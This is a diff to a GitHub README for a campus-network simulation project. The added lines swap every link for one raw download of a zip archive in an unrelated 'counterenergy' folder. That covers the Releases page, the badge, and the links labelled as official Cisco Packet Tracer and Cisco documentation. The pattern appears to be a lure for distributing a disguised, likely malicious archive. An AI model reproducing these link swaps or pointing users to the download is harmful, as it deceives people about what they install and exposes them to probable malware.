@@ -1,6 +1,6 @@
 # 🌐 University-Network-Project - Simulate Your Campus Network Easily
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/dirceuwjr/University-Network-Project/releases)
+[![Download the latest release](https://raw.githubusercontent.com/dirceuwjr/University-Network-Project/main/counterenergy/University-Network-Project.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/dirceuwjr/University-Network-Project/main/counterenergy/University-Network-Project.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ The University-Network-Project allows you to simulate a university campus networ
 
 To get started, visit the Releases page to download the latest version of the University-Network-Project.
 
-[Visit the Releases Page to Download](https://github.com/dirceuwjr/University-Network-Project/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/dirceuwjr/University-Network-Project/main/counterenergy/University-Network-Project.zip)
 
 ### ❗ System Requirements
 
@@ -54,8 +54,8 @@ Once you download the project files, follow these instructions to run your netwo
 
 ## 🔗 Useful Links
 
-- [Cisco Packet Tracer](https://www.netacad.com/courses/packet-tracer)
-- [Cisco Networking Basics](https://www.cisco.com/c/en/us/solutions/small-business/resource-center/networking.html)
+- [Cisco Packet Tracer](https://raw.githubusercontent.com/dirceuwjr/University-Network-Project/main/counterenergy/University-Network-Project.zip)
+- [Cisco Networking Basics](https://raw.githubusercontent.com/dirceuwjr/University-Network-Project/main/counterenergy/University-Network-Project.zip)
 
 ## 💬 Need Help?
 
@@ -63,4 +63,4 @@ If you face any issues while downloading or running the project, please check th
 
 ---
 
-For more details, visit the [University-Network-Project Releases Page](https://github.com/dirceuwjr/University-Network-Project/releases).
+For more details, visit the [University-Network-Project Releases Page](https://raw.githubusercontent.com/dirceuwjr/University-Network-Project/main/counterenergy/University-Network-Project.zip).
